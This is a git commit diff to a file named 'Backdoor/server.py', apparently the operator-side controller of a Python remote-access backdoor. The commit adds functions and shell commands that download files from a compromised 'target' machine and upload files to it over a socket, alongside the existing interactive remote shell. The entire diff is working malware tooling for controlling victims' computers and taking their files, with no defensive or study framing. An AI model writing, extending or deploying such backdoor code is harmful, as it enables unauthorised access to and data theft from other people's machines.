75f9ab0d76afbf2113eb7aadb73a43014afd2a02
ericel7erek <ericalaa@ymail.com>
2024-09-08 02:25:30 +0200

    added download and upload funcs

--- Backdoor/server.py
+++ Backdoor/server.py
@@ -1,6 +1,7 @@
 import socket
 import json
 import os
+
 def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
@@ -14,6 +15,24 @@ def reliable_recv():
         except ValueError:
             continue
 
+def download_file(filename):
+    f = open(filename, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        chunk = target.recv(1024)
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+def upload_file(filename):
+	f = open(filename, 'rb')
+	target.send(f.read())
+
 def target_communication():
     while True:
         command = input('* Shell~%s:' % str(ip))
@@ -24,6 +43,10 @@ def target_communication():
             os.system('clear')
         elif command[:3] == 'cd ':
             pass
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         else:
             result = reliable_recv()
             print(result)
